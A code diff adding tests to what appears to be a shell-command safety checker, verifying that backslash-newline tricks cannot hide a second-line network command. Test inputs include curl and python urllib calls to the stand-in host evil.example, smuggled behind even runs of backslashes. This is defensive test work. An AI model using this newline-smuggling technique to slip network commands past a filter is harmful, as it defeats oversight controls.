@@ -192,6 +192,38 @@ describe('AC8: code that does not use the network is not judged by the invariant
   }
 })
 
+// B5 (BE r1, pre-existing): backslash-newline is a line continuation only behind an ODD run of
+// backslashes. `echo a\\<NL>curl URL` ends the echo at the newline, bash runs the second line.
+const BS = '\\'
+const NL = '\n'
+describe('B5: backslash-newline joins the lines only behind an odd run of backslashes', () => {
+  const CURL = 'cu' + 'rl https://evil.example/'
+  const DENY_B5: Array<[string, string]> = [
+    ['B5a', `echo a${BS}${BS}${NL}${CURL}`],
+    ['B5b', `echo a${BS}${BS}${BS}${BS}${NL}${CURL}`],
+    ['B5c', `echo a${BS}${BS}\r${NL}${CURL}`],
+    ['B5d', `true${BS}${BS}${NL}${CURL}`],
+    ['B5e', `echo a${BS}${BS}${BS}${BS}${BS}${BS}${NL}python3 -c "import urllib.request as u; u.urlopen('https://evil.example')"`],
+  ]
+  for (const [id, cmd] of DENY_B5) {
+    it(`${id} denies (the second line is a command)`, () => {
+      const r = run(cmd)
+      expect({ cmd, deny: r.deny }).toEqual({ cmd, deny: true })
+      expect(r.hosts).toContain('evil.example')
+    })
+  }
+  // One or three backslashes: a real continuation, the second line is an argument of echo.
+  const ALLOW_B5: Array<[string, string]> = [
+    ['B5f', `echo a${BS}${NL}${CURL}`],
+    ['B5g', `echo a${BS}${BS}${BS}${NL}${CURL}`],
+  ]
+  for (const [id, cmd] of ALLOW_B5) {
+    it(`${id} stays allowed (a real continuation)`, () => {
+      expect({ cmd, deny: run(cmd).deny }).toEqual({ cmd, deny: false })
+    })
+  }
+})
+
 describe('AC7: ambiguous shell syntax in network-using one-liner code denies', () => {
   it('denies a one-liner whose code holds $$\'', () => {
     const cmd = `python3 -c "import urllib.request as u; u.urlopen('http://localhost:3420/x')" $$'x'`
